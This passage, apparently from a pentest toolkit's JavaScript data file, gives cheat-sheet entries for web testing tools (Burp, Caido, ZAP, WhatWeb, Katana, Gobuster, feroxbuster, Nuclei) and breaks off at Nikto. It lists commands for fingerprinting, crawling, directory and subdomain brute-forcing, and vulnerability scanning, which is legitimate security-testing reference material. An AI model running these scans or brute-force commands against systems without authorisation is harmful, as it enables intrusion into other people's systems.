        name: "Burp Suite",
        url: "https://portswigger.net/burp",
        description: "The industry-standard intercepting proxy and web application testing platform.",
        brief: "Burp Suite is the tool most web application testing is actually done in. At its core it is an intercepting proxy that sits between your browser and the target, letting you view, modify, and replay every request. Around that core sits a suite of modules — Repeater for manual request tinkering, Intruder for automated attacks, Scanner (Pro) for automated vulnerability discovery, and an extension ecosystem via the BApp store.\n\nThe free Community Edition covers the manual workflow that matters most for learning; the Professional edition adds the automated scanner, unthrottled Intruder, and the extensions that depend on them.",
        quickReference: [
          { label: "Proxy your browser", cmd: "Set browser proxy to 127.0.0.1:8080, install Burp's CA cert" },
          { label: "Intercept and edit a request", cmd: "Proxy tab -> Intercept is on -> edit -> Forward" },
          { label: "Send a request for manual testing", cmd: "Right-click a request -> Send to Repeater (Ctrl+R)" },
          { label: "Automate parameter attacks", cmd: "Right-click -> Send to Intruder (Ctrl+I) -> mark positions -> set payloads" },
          { label: "Built-in browser (no proxy setup)", cmd: "Proxy tab -> Open Browser" }
        ],
        sections: [
          {
            title: "Core Modules",
            type: "table",
            columns: ["Module", "Purpose"],
            rows: [
              ["Proxy", "Intercept, view, and modify traffic between browser and target — the heart of the tool"],
              ["Repeater", "Manually resend and tweak a single request over and over — the manual-testing workhorse"],
              ["Intruder", "Automate a request with payload sets — fuzzing, brute forcing, enumeration"],
              ["Scanner (Pro)", "Automated active and passive vulnerability scanning"],
              ["Sequencer", "Analyse randomness of tokens (session IDs, CSRF tokens)"],
              ["Decoder", "Encode/decode data — URL, Base64, hex, HTML, and more"],
              ["Comparer", "Diff two requests or responses to spot subtle differences"],
              ["Target / Site map", "The crawled structure of the application and its scope"]
            ]
          },
          {
            title: "Intruder Attack Types",
            type: "table",
            columns: ["Type", "Behaviour"],
            rows: [
              ["Sniper", "One payload set, one position at a time — the default for testing a single parameter"],
              ["Battering ram", "One payload set placed into all positions simultaneously"],
              ["Pitchfork", "Multiple payload sets in parallel (payload 1 in pos 1, payload 2 in pos 2)"],
              ["Cluster bomb", "Every combination of multiple payload sets — for username/password pairs"]
            ]
          },
          {
            title: "Essential Extensions (BApp Store)",
            type: "table",
            columns: ["Extension", "What it adds"],
            rows: [
              ["Autorize", "Automated authorization/access-control testing — replay requests as a low-priv user"],
              ["Logger++", "A powerful, filterable log of all traffic across tools"],
              ["Active Scan++", "Extends the scanner's checks"],
              ["Param Miner", "Discovers hidden parameters and headers (cache poisoning, HTTP smuggling)"],
              ["JWT Editor", "Inspect and attack JSON Web Tokens inline"],
              ["Turbo Intruder", "Extremely fast, scriptable request sending — race conditions, huge fuzzing"],
              ["Collaborator Everywhere", "Injects out-of-band payloads to catch blind vulnerabilities (Pro)"]
            ]
          },
          {
            title: "Match & Replace / Workflow Tips",
            type: "table",
            columns: ["Feature", "Use"],
            rows: [
              ["Scope", "Set target scope early so tools and logging ignore noise from third-party domains"],
              ["Match and Replace", "Automatically rewrite headers/bodies on the fly (e.g. inject a header on every request)"],
              ["Session handling rules", "Automate re-authentication and CSRF token handling during automated attacks"],
              ["Save/restore project", "Persist an engagement's traffic and findings (Pro saves to disk incrementally)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Manual test of a single request", cmd: "1. Browse the feature through Burp's proxy\n2. Find the request in Proxy > HTTP history\n3. Send to Repeater (Ctrl+R)\n4. Modify one thing at a time, resend, compare responses" },
              { label: "Brute force / fuzz a parameter", cmd: "1. Send the request to Intruder (Ctrl+I)\n2. Clear positions, mark just the target parameter\n3. Choose Sniper, load a payload list\n4. Start attack, sort results by status/length to spot anomalies" },
              { label: "Access control testing", cmd: "1. Log in as a high-priv user, map the app\n2. Install Autorize, set a low-priv session cookie\n3. Re-browse — Autorize flags any request the low-priv user should NOT be able to make" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Community Edition is enough to learn the manual workflow — Proxy, Repeater, and Intruder (throttled). The Scanner and unthrottled Intruder are the main Pro upgrades.",
              "Set your target scope before anything else; it keeps the site map, history, and scanner focused and stops you touching out-of-scope third parties.",
              "Repeater is where real understanding happens — change one variable, resend, and read the difference. Most findings come from here, not the scanner.",
              "Install the Burp CA certificate in your browser or HTTPS traffic will throw errors and you will see nothing useful.",
              "Caido is a lighter, modern alternative with a similar workflow — worth trying if Burp feels heavy."
            ]
          }
        ]
      },
      {
        id: "caido",
        name: "Caido",
        url: "https://caido.io/",
        description: "A modern, lightweight web proxy — a fast alternative to Burp Suite.",
        brief: "Caido is a newer web security proxy built in Rust, designed to be lighter and faster than Burp while covering the same core workflow: intercept traffic, replay and modify requests, automate attacks, and script the whole thing. Its client/server split means the proxy engine can run on a remote box (a VPS in scope) while you drive it from a local GUI.\n\nIt is increasingly popular for its clean interface, low resource use, and a generous free tier, and its Workflow feature offers a visual way to build request-processing logic without writing an extension.",
        quickReference: [
          { label: "Proxy your browser", cmd: "Point browser at Caido's proxy port, install its CA cert" },
          { label: "Replay a request", cmd: "Right-click a request -> Replay (Caido's Repeater equivalent)" },
          { label: "Automate an attack", cmd: "Send to Automate -> define payload positions and lists" },
          { label: "Run remotely", cmd: "Run the caido-cli server on a VPS, connect the desktop client to it" }
        ],
        sections: [
          {
            title: "Core Features",
            type: "table",
            columns: ["Feature", "Purpose"],
            rows: [
              ["Intercept", "View and modify requests in flight, like any proxy"],
              ["Replay", "Caido's Repeater — resend and tweak individual requests"],
              ["Automate", "Caido's Intruder — payload-driven automated attacks"],
              ["Workflows", "A visual, node-based pipeline for transforming requests/responses"],
              ["HTTPQL", "A query language for filtering the traffic history precisely"],
              ["Findings", "Tag and collect notable requests as you work"],
              ["Plugins", "A growing extension ecosystem"]
            ]
          },
          {
            title: "Caido vs Burp",
            type: "table",
            columns: ["Aspect", "Note"],
            rows: [
              ["Performance", "Rust-based, noticeably lighter on memory and CPU"],
              ["Client/server split", "The proxy can run remotely (in-scope VPS) while you drive it locally — Burp does not do this natively"],
              ["Maturity", "Smaller extension ecosystem and fewer advanced modules than Burp Pro today"],
              ["Learning curve", "Cleaner UI; the concepts map almost one-to-one onto Burp"],
              ["Pricing", "Generous free tier; paid tiers for teams and advanced features"]
            ]
          },
          {
            title: "HTTPQL Filtering",
            type: "table",
            columns: ["Query", "Matches"],
            rows: [
              ["req.method.eq:\"POST\"", "Only POST requests"],
              ["resp.code.gte:500", "Server errors — often where bugs surface"],
              ["req.path.cont:\"admin\"", "Requests whose path contains 'admin'"],
              ["resp.raw.cont:\"error\"", "Responses containing a string"],
              ["Combine with and/or", "Chain conditions to isolate exactly the traffic you care about"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard manual testing", cmd: "1. Proxy the browser through Caido, install the CA cert\n2. Browse the app; filter history with HTTPQL\n3. Right-click an interesting request -> Replay\n4. Tweak and resend, watch the response" },
              { label: "Remote proxy on an in-scope host", cmd: "# run the server where the engagement expects traffic to originate\ncaido-cli --listen 0.0.0.0:8080\n# connect the desktop client to that server's address" },
              { label: "Automated parameter fuzzing", cmd: "1. Send a request to Automate\n2. Mark the injection point, attach a payload list\n3. Run, then sort results by status/length for anomalies" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "If you already know Burp, Caido's concepts map almost directly — Replay is Repeater, Automate is Intruder.",
              "The client/server split is the standout feature: run the proxy on an in-scope VPS so your traffic originates from where the client expects it.",
              "HTTPQL makes finding the one interesting request in thousands genuinely fast — learn a few operators early.",
              "The extension ecosystem is smaller than Burp's; check whether a Burp-specific extension you rely on has a Caido equivalent before switching a live engagement."
            ]
          }
        ]
      },
      {
        id: "zap",
        name: "OWASP ZAP",
        url: "https://www.zaproxy.org/",
        description: "Free, open-source web app scanner and proxy — strong for automation and CI.",
        brief: "ZAP (Zed Attack Proxy) is OWASP's free, open-source web application security scanner. It does the intercepting-proxy job like Burp, but its real strength is automation: a full-featured active and passive scanner, a headless daemon mode, and a scriptable API make it the go-to for baking security testing into CI/CD pipelines.\n\nBecause it is genuinely free and open source — scanner included — it is also the natural starting point for anyone who cannot justify Burp Pro, and a solid second opinion alongside it.",
        quickReference: [
          { label: "Automated scan of a target (GUI)", cmd: "Quick Start -> Automated Scan -> enter URL -> Attack" },
          { label: "Headless baseline scan", cmd: "zap.sh -cmd -quickurl https://target.com -quickout report.html" },
          { label: "Run as a daemon with API", cmd: "zap.sh -daemon -host 127.0.0.1 -port 8090 -config api.key=<key>" },
          { label: "Baseline scan via Docker (CI)", cmd: "docker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py -t https://target.com" }
        ],
        sections: [
          {
            title: "Scan Types",
            type: "table",
            columns: ["Scan", "Behaviour"],
            rows: [
              ["Passive scan", "Analyses traffic you generate by browsing — never sends its own attacks, completely safe"],
              ["Active scan", "Actively sends attack payloads to find vulnerabilities — only against authorised targets"],
              ["Spider", "Classic crawler that follows links to map the app"],
              ["AJAX Spider", "Drives a real browser to crawl JavaScript-heavy single-page apps"],
              ["Fuzzer", "Payload-driven fuzzing of chosen parameters"]
            ]
          },
          {
            title: "Automation & CI",
            type: "table",
            columns: ["Mode", "Use"],
            rows: [
              ["zap-baseline.py", "Fast passive scan — ideal as a non-blocking CI gate"],
              ["zap-full-scan.py", "Adds active scanning for a deeper (slower) CI run"],
              ["zap-api-scan.py", "Scans an API from an OpenAPI/SOAP/GraphQL definition"],
              ["Daemon + REST API", "Drive every ZAP function programmatically from any language"],
              ["Automation Framework", "Define scans as YAML plans for repeatable, version-controlled runs"]
            ]
          },
          {
            title: "ZAP vs Burp",
            type: "table",
            columns: ["Aspect", "Note"],
            rows: [
              ["Cost", "Fully free and open source, scanner included — no paid tier"],
              ["Automation", "Purpose-built for CI/CD; the scripted/headless story is stronger than Burp's out of the box"],
              ["Manual testing UX", "Serviceable, but Burp's Repeater/Intruder feel smoother to most testers"],
              ["Best role", "Automated scanning, CI gating, and a free second opinion alongside Burp"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Quick authorised assessment", cmd: "1. GUI > Quick Start > Automated Scan\n2. Enter the URL, run spider + active scan\n3. Read the Alerts tab, triage by risk\n4. Export an HTML report" },
              { label: "CI security gate", cmd: "# fail the build on new medium+ issues\ndocker run -t ghcr.io/zaproxy/zaproxy zap-baseline.py \\\n  -t https://staging.target.com -r zap_report.html" },
              { label: "Scan an API from its spec", cmd: "docker run -t ghcr.io/zaproxy/zaproxy zap-api-scan.py \\\n  -t https://target.com/openapi.json -f openapi" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Passive scanning is completely safe — it only analyses traffic you generate. Active scanning sends real attacks and needs authorisation.",
              "ZAP's automation and API are its edge over Burp; if you want security testing in a pipeline, start here.",
              "The AJAX Spider (real-browser crawling) is essential for single-page apps that the classic spider cannot map.",
              "Run it alongside Burp rather than instead of it — the two scanners flag different things, and ZAP costs nothing.",
              "Tune the scan policy before an active scan; the defaults can be noisy and slow on large apps."
            ]
          }
        ]
      },
      {
        id: "whatweb",
        name: "WhatWeb",
        url: "https://github.com/urbanadventurer/WhatWeb",
        description: "Fingerprints web technologies — CMS, frameworks, servers, and versions.",
        brief: "WhatWeb identifies what a website is built with. It sends requests and matches the responses against 1800+ plugins to recognise content management systems, web frameworks, JavaScript libraries, analytics, servers, and — where exposed — their versions. Knowing the stack is the first step of any web assessment, because it tells you which specific attacks and known CVEs are even relevant.\n\nIt runs at adjustable aggression levels, from a single passive request to active probing, so you can trade stealth against detail.",
        quickReference: [
          { label: "Fingerprint a site", cmd: "whatweb https://target.com" },
          { label: "Verbose, show every detail", cmd: "whatweb -v https://target.com" },
          { label: "Scan a list of hosts", cmd: "whatweb -i hosts.txt --log-brief=results.txt" },
          { label: "Turn up aggression for versions", cmd: "whatweb -a 3 https://target.com" }
        ],
        sections: [
          {
            title: "Aggression Levels",
            type: "table",
            columns: ["Level", "Behaviour"],
            rows: [
              ["-a 1 (Stealthy)", "One HTTP request per target — passive, quiet, least detail"],
              ["-a 2 (Unused)", "Reserved; rarely used"],
              ["-a 3 (Aggressive)", "A few extra requests to confirm and extract versions — the usual choice"],
              ["-a 4 (Heavy)", "Many requests, most thorough, loudest"]
            ]
          },
          {
            title: "Useful Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-v", "Verbose — show the evidence behind each match"],
              ["-i <file>", "Read targets from a file"],
              ["--log-brief / --log-verbose / --log-json", "Write results in various formats"],
              ["-U <agent>", "Set a custom User-Agent"],
              ["--max-threads <n>", "Concurrency for list scans"],
              ["-p <plugins>", "Run only specific plugins"]
            ]
          },
          {
            title: "What It Detects",
            type: "table",
            columns: ["Category", "Examples"],
            rows: [
              ["CMS", "WordPress, Drupal, Joomla — often with version, which feeds a targeted scanner"],
              ["Frameworks", "Laravel, Django, Rails, Express, Spring"],
              ["Servers", "nginx, Apache, IIS, plus versions from headers"],
              ["Front-end", "jQuery, React, Vue, Bootstrap and their versions"],
              ["Infrastructure", "CDNs, WAFs, load balancers, analytics, cloud providers"],
              ["Interesting headers", "Security headers present or absent, framework leakage"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Fingerprint, then pick the right tool", cmd: "whatweb -a 3 -v https://target.com\n# WordPress detected -> run wpscan next\n# specific framework version -> search it for known CVEs" },
              { label: "Bulk-fingerprint discovered subdomains", cmd: "whatweb -i subdomains.txt --log-json=stack.json --max-threads 25\n# then group hosts by technology to plan the assessment" },
              { label: "Feed httpx-discovered hosts", cmd: "cat live_hosts.txt | while read u; do whatweb -a 1 \"$u\"; done" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Level 1 is passive (one request) and safe for reconnaissance; level 3 is the sweet spot when you want versions and are authorised to probe.",
              "A detected CMS is a signpost — WordPress sends you to wpscan, a framework version sends you to a CVE search.",
              "Browser extensions like Wappalyzer do the same fingerprinting interactively while you browse; WhatWeb is the scriptable, bulk version.",
              "Version numbers are the payoff: an exact framework/server version turns a broad assessment into a targeted one.",
              "Combine with Nuclei's technology templates for automated follow-up on what WhatWeb identifies."
            ]
          }
        ]
      },
      {
        id: "katana",
        name: "Katana",
        url: "https://github.com/projectdiscovery/katana",
        description: "Fast crawler that maps endpoints and parameters, including JavaScript-rendered ones.",
        brief: "Katana is ProjectDiscovery's crawler, built to enumerate a web application's URLs, endpoints, and parameters quickly and feed them into the rest of a pipeline. It has two modes: a fast standard crawler and a headless mode that drives a real browser to reach the routes and endpoints that only appear after JavaScript runs — which is most of the modern web.\n\nIt is the discovery stage that turns a single domain into a full list of testable endpoints for fuzzing, scanning, and manual review.",
        quickReference: [
          { label: "Crawl a target", cmd: "katana -u https://target.com" },
          { label: "Headless crawl (JS-rendered)", cmd: "katana -u https://target.com -headless" },
          { label: "Crawl and keep parameters", cmd: "katana -u https://target.com -jc -kf all -o endpoints.txt" },
          { label: "Passive crawl from archives", cmd: "katana -u https://target.com -passive" }
        ],
        sections: [
          {
            title: "Crawl Modes",
            type: "table",
            columns: ["Flag", "Behaviour"],
            rows: [
              ["(default)", "Standard fast crawler using the HTTP engine"],
              ["-headless", "Drives a real Chromium to capture JavaScript-rendered routes and XHR endpoints"],
              ["-passive", "Pulls URLs from sources like the Wayback Machine and Common Crawl — no requests to target"],
              ["-jc / -jsl", "Parse JavaScript files for endpoints and crawl/scrape them"]
            ]
          },
          {
            title: "Scope & Depth",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <n>", "Maximum crawl depth"],
              ["-fs <scope>", "Field scope: fqdn, rdn (root domain), or dn — how far off-host to wander"],
              ["-kf <fields>", "Known files to fetch (robots.txt, sitemap.xml)"],
              ["-cs / -crawl-scope", "Regex to include only matching URLs"],
              ["-do / -crawl-out-scope", "Regex to exclude URLs (logout, etc.)"],
              ["-c <n> / -p <n>", "Concurrency and parallelism"]
            ]
          },
          {
            title: "Output & Filtering",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-o <file>", "Write results to a file"],
              ["-jsonl", "JSON Lines output with full request detail"],
              ["-f <field>", "Output only a field: url, path, qurl (URLs with params), etc."],
              ["-em / -ef <ext>", "Match or filter by extension"],
              ["-silent", "URLs only, clean for piping"],
              ["-mdc <filter>", "Match on DSL conditions (status, content type)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Full endpoint discovery pipeline", cmd: "katana -u https://target.com -headless -jc -kf all -silent \\\n  | tee endpoints.txt\n# parameterised URLs feed fuzzing:\ngrep '?' endpoints.txt | sort -u > params.txt" },
              { label: "Feed a vulnerability scan", cmd: "katana -u https://target.com -silent | nuclei -t http/ -severity medium,high,critical" },
              { label: "Combine with archive URLs", cmd: "katana -u https://target.com -passive -silent > archive_urls.txt\nkatana -u https://target.com -headless -silent > live_urls.txt\nsort -u archive_urls.txt live_urls.txt > all_endpoints.txt" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Headless mode is essential for single-page apps — the standard crawler cannot see routes that only exist after JavaScript executes.",
              "Use -jc to parse JavaScript files; modern apps hide most of their API endpoints in bundled JS, not in HTML links.",
              "Set an out-of-scope regex for logout and destructive links, or an authenticated crawl will log itself out or delete data.",
              "It is built to pipe: katana -> httpx -> nuclei is a standard discovery-to-scan chain.",
              "The passive mode overlaps with gau/waybackurls — combine them for the widest endpoint set."
            ]
          }
        ]
      },
      {
        id: "gobuster",
        name: "Gobuster",
        url: "https://github.com/OJ/gobuster",
        description: "Fast brute-forcer for directories, DNS subdomains, vhosts, and more.",
        brief: "Gobuster is a fast, Go-based brute-forcing tool with several modes: it discovers hidden directories and files on a web server, enumerates DNS subdomains, finds virtual hosts, and more. It is the classic content-discovery step — throw a wordlist at a target and find the admin panels, backup files, and API paths that are not linked from anywhere.\n\nIt is simple, fast, and does one job per mode well, which is why it remains a default even alongside newer tools like feroxbuster and ffuf.",
        quickReference: [
          { label: "Directory/file discovery", cmd: "gobuster dir -u https://target.com -w wordlist.txt" },
          { label: "With extensions", cmd: "gobuster dir -u https://target.com -w wordlist.txt -x php,txt,bak" },
          { label: "DNS subdomain enumeration", cmd: "gobuster dns -d target.com -w subdomains.txt" },
          { label: "Virtual host discovery", cmd: "gobuster vhost -u https://target.com -w subdomains.txt --append-domain" }
        ],
        sections: [
          {
            title: "Modes",
            type: "table",
            columns: ["Mode", "Purpose"],
            rows: [
              ["dir", "Brute-force directories and files on a web server"],
              ["dns", "Enumerate subdomains via DNS resolution"],
              ["vhost", "Discover virtual hosts sharing an IP by fuzzing the Host header"],
              ["fuzz", "Generic FUZZ-keyword fuzzing, ffuf-style"],
              ["s3 / gcs", "Enumerate open cloud storage buckets"],
              ["tftp", "Enumerate files on a TFTP server"]
            ]
          },
          {
            title: "Directory Mode Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-w <wordlist>", "Wordlist to use — required"],
              ["-x <exts>", "Append extensions to each word (php, html, bak, txt)"],
              ["-t <n>", "Number of concurrent threads (default 10)"],
              ["-s / -b", "Status codes to include / blacklist"],
              ["-k", "Skip TLS certificate verification"],
              ["-c <cookies>", "Send cookies (for authenticated discovery)"],
              ["-H <header>", "Add a custom header, repeatable"],
              ["-r", "Follow redirects"]
            ]
          },
          {
            title: "Tuning & Accuracy",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Wildcard responses", "If every path returns 200, use -b or --exclude-length to filter the catch-all"],
              ["--exclude-length <n>", "Drop responses of a specific size — the false-positive killer"],
              ["Extensions matter", "Always add -x for the stack (php for PHP apps, aspx for .NET)"],
              ["Wordlist choice", "SecLists Discovery/Web-Content is the standard source; size the list to your time budget"],
              ["Rate/threads", "Raise -t for speed, lower it if you trip a WAF or rate limit"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard content discovery", cmd: "gobuster dir -u https://target.com \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\\n  -x php,txt,bak,old -t 50 -o gobuster.txt" },
              { label: "Kill false positives", cmd: "# note the catch-all response size first, then:\ngobuster dir -u https://target.com -w list.txt --exclude-length 1234" },
              { label: "Subdomain enumeration", cmd: "gobuster dns -d target.com \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\\n  -t 50 -o subs.txt" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always add extensions with -x that match the target's stack — discovering index.php requires telling gobuster to try .php.",
              "Handle wildcard/catch-all responses with --exclude-length, or your results will be a wall of false 200s.",
              "feroxbuster adds automatic recursion and ffuf adds more flexible fuzzing; gobuster wins on simplicity and raw speed for a flat scan.",
              "For authenticated discovery, pass the session cookie with -c so you enumerate the post-login surface.",
              "SecLists is the wordlist source — see the Wordlists section of this toolkit."
            ]
          }
        ]
      },
      {
        id: "feroxbuster",
        name: "feroxbuster",
        url: "https://github.com/epi052/feroxbuster",
        description: "Recursive content discovery scanner — fast, with automatic directory recursion.",
        brief: "feroxbuster is a Rust-based content-discovery tool whose defining feature is automatic recursion: when it finds a directory, it dives into it and keeps fuzzing, building out the full tree without you re-running the tool for each level. It is fast, has smart automatic filtering to suppress false positives, and can resume interrupted scans.\n\nWhere gobuster gives you a flat scan of one directory, feroxbuster gives you the whole structure in one command, which is why many testers reach for it first on an unfamiliar app.",
        quickReference: [
          { label: "Recursive discovery", cmd: "feroxbuster -u https://target.com -w wordlist.txt" },
          { label: "With extensions", cmd: "feroxbuster -u https://target.com -w wordlist.txt -x php,txt,bak" },
          { label: "Control recursion depth", cmd: "feroxbuster -u https://target.com -w wordlist.txt -d 2" },
          { label: "Filter out a response size", cmd: "feroxbuster -u https://target.com -w wordlist.txt -S 1234" }
        ],
        sections: [
          {
            title: "Key Options",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-u <url>", "Target URL"],
              ["-w <wordlist>", "Wordlist"],
              ["-x <exts>", "Extensions to append"],
              ["-d <n>", "Maximum recursion depth (default 4; 1 disables recursion)"],
              ["-t <n>", "Concurrent threads (default 50)"],
              ["-r", "Follow redirects and keep scanning the redirected URL"],
              ["-k", "Skip TLS verification"],
              ["-o <file>", "Write results to a file"],
              ["-m <method>", "HTTP method to use (default GET; e.g. POST)"],
              ["-H <header>", "Add a custom header (repeatable) — e.g. Authorization"],
              ["-b <cookie>", "Send a cookie with every request (authenticated scans)"],
              ["-a <ua> / -A", "Set a custom User-Agent, or -A for a random one per request"],
              ["-f", "Append a slash to each word to find directories behind redirects"],
              ["-T <secs>", "Per-request timeout (default 7s)"],
              ["--burp", "Route every request through Burp (127.0.0.1:8080)"],
              ["--stdin", "Read target URLs from stdin (scan a list)"],
              ["--resume-from <file>", "Resume a previously interrupted scan"]
            ]
          },
          {
            title: "Filtering (False-Positive Control)",
            type: "table",
            columns: ["Flag", "Filters out responses by"],
            rows: [
              ["-S <size>", "Content length / size"],
              ["-C <code>", "Status code"],
              ["-W <words>", "Word count"],
              ["-N <lines>", "Line count"],
              ["--filter-regex <re>", "A regex match in the body"],
              ["--auto-tune / --auto-bail", "Automatically adjust to rate limits or bail on too many errors"]
            ]
          },
          {
            title: "Recursion Behaviour",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Automatic recursion", "Any discovered directory is queued and fuzzed automatically"],
              ["-d depth", "Caps how deep it goes; on a large app start shallow to avoid an explosion"],
              ["--dont-scan <re>", "Exclude paths from recursion (logout, huge static dirs)"],
              ["Force/prevent per-dir", "Interactive controls let you add or skip directories mid-scan"],
              ["Scan time", "Grows fast with depth x wordlist size — tune both deliberately"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "1. First pass — recursive discovery with sane limits", cmd: "feroxbuster -u https://target.com \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -x php,html,txt -d 2 -t 100 -o ferox.txt\n# default wordlist is raft-medium-directories.txt; -d 2 stops a recursion explosion" },
              { label: "2. Tame a noisy / catch-all target", cmd: "# a soft-404 returns 200 for everything — find its size and filter it out\nferoxbuster -u https://target.com -w list.txt --silent          # observe the constant size\nferoxbuster -u https://target.com -w list.txt -S 285 --auto-tune  # filter it, back off on rate limits" },
              { label: "3. Authenticated scan (cookies + headers)", cmd: "feroxbuster -u https://target.com -b 'PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4' \\\n  -H 'Authorization: Bearer <token>' -H 'Content-Type: application/x-www-form-urlencoded'\n# reach content only visible to a logged-in user" },
              { label: "4. Non-GET methods + Burp routing", cmd: "feroxbuster -u https://target.com -m POST                 # brute-force POST endpoints\nferoxbuster -u https://target.com -A --burp -q            # random UA, proxied through Burp for review" },
              { label: "5. Scan a list of targets from stdin", cmd: "cat targets.txt | feroxbuster --stdin -q -x php,txt -o multi.txt\n# one feroxbuster run across many hosts" },
              { label: "6. Resume after interruption", cmd: "# feroxbuster saves a .state file on Ctrl-C; pick up where it stopped\nferoxbuster --resume-from ferox-http_target-1723370176.state -q" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Automatic recursion is the reason to use it — but cap depth with -d on a large app or the scan explodes combinatorially.",
              "Its automatic filtering suppresses many false positives out of the box; add -S/-C/-W manually when a catch-all slips through.",
              "Use --dont-scan to skip logout links and enormous static directories that would waste hours.",
              "It resumes interrupted scans, which matters on slow or flaky targets — save the state file.",
              "gobuster, feroxbuster, and ffuf overlap; feroxbuster's niche is effortless full-tree recursion."
            ]
          }
        ]
      },
      {
        id: "nuclei",
        name: "Nuclei",
        url: "https://github.com/projectdiscovery/nuclei",
        description: "Template-based vulnerability scanner driven by a huge community template library.",
        brief: "Nuclei is a fast, template-driven vulnerability scanner. Instead of hardcoded checks, it runs YAML templates that each describe how to detect one specific issue — a CVE, an exposed panel, a misconfiguration, a default credential. A community library of thousands of templates is maintained and updated constantly, so the moment a new CVE gets a template, you can scan for it everywhere.\n\nThat model is its power: it is essentially a distributed detection engine where the detection logic is shared, versioned, and trivially extensible. Point it at a host list and it tells you which known issues actually apply.",
        quickReference: [
          { label: "Scan a target with all templates", cmd: "nuclei -u https://target.com" },
          { label: "Scan a list of hosts", cmd: "nuclei -l hosts.txt" },
          { label: "Only high/critical", cmd: "nuclei -l hosts.txt -severity high,critical" },
          { label: "Specific template tags", cmd: "nuclei -u https://target.com -tags cve,exposure" },
          { label: "Update templates", cmd: "nuclei -update-templates" }
        ],
        sections: [
          {
            title: "Template Selection",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <path>", "Run specific templates or a template directory (e.g. http/cves/)"],
              ["-tags <tags>", "Filter by tag: cve, exposure, misconfig, takeover, default-login"],
              ["-severity <levels>", "Filter by severity: info, low, medium, high, critical"],
              ["-id <id>", "Run a single template by its ID"],
              ["-etags / -exclude", "Exclude noisy or dangerous template categories"],
              ["-as", "Automatic scan — select templates by detected technology (Wappalyzer-style)"]
            ]
          },
          {
            title: "Template Categories",
            type: "table",
            columns: ["Category", "Detects"],
            rows: [
              ["cves", "Known CVEs with public detection logic"],
              ["exposures", "Exposed config files, .git, backups, env files, dashboards"],
              ["misconfiguration", "Security misconfigurations and weak settings"],
              ["default-logins", "Services still on default credentials"],
              ["takeovers", "Subdomain takeover conditions"],
              ["technologies", "Fingerprinting templates that identify the stack"],
              ["exposed-panels", "Login and admin panels reachable from outside"]
            ]
          },
          {
            title: "Performance & Output",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-rl <n>", "Rate limit (requests per second) — be a good neighbour"],
              ["-c <n>", "Concurrency (templates run in parallel)"],
              ["-bs <n>", "Bulk size (hosts scanned in parallel per template)"],
              ["-json / -jsonl", "Structured output for tooling"],
              ["-o <file>", "Write findings to a file"],
              ["-silent", "Only print findings, no status noise"],
              ["-timeout / -retries", "Tune for slow or flaky targets"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Standard pipeline from discovery", cmd: "subfinder -d target.com -silent | httpx -silent | \\\n  nuclei -severity medium,high,critical -o nuclei.txt" },
              { label: "Hunt exposures and takeovers", cmd: "nuclei -l hosts.txt -tags exposure,takeover,default-login -o quickwins.txt" },
              { label: "Technology-aware automatic scan", cmd: "nuclei -u https://target.com -as -severity high,critical\n# picks templates matching the detected stack" },
              { label: "Scan for one fresh CVE across the estate", cmd: "nuclei -l hosts.txt -id CVE-2024-XXXXX" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Update templates before every engagement (-update-templates); the value is in the freshness of the community library.",
              "Start with -severity high,critical and the exposure/takeover/default-login tags — that is where the fast, undeniable wins are.",
              "Set a rate limit on production targets; Nuclei is fast enough to cause problems if you let it run flat out.",
              "It only finds what a template describes — a clean Nuclei run means 'no known-templated issues', not 'secure'. Follow with manual testing.",
              "Writing your own templates is easy and worth it for target-specific checks; the YAML DSL is well documented."
            ]
          }
        ]
      },
      {
        id: "nikto",
        name: "Nikto",
        url: "https://github.com/sullo/nikto",
        description: "Classic web server scanner for known issues, files, and misconfigurations.",
        brief: "Nikto is a long-standing web server scanner that checks a target against a database of thousands of known-dangerous files, outdated server versions, and common misconfigurations. It is noisy and not subtle, but it is comprehensive and fast to run, which makes it a solid early sweep to catch the obvious things — default files, dangerous CGIs, missing security headers, and server software with known problems.\n\nIt is old, and newer tools like Nuclei overlap with it, but it still surfaces findings the modern tools miss and remains a common item on a methodology checklist.",
        quickReference: [
          { label: "Scan a host", cmd: "nikto -h https://target.com" },
          { label: "Scan a specific port", cmd: "nikto -h target.com -p 8443 -ssl" },
          { label: "Save an HTML report", cmd: "nikto -h https://target.com -o report.html -Format htm" },
          { label: "Tune which checks run", cmd: "nikto -h https://target.com -Tuning 123bde" }
        ],
        sections: [
          {
            title: "Key Options",
            type: "table",
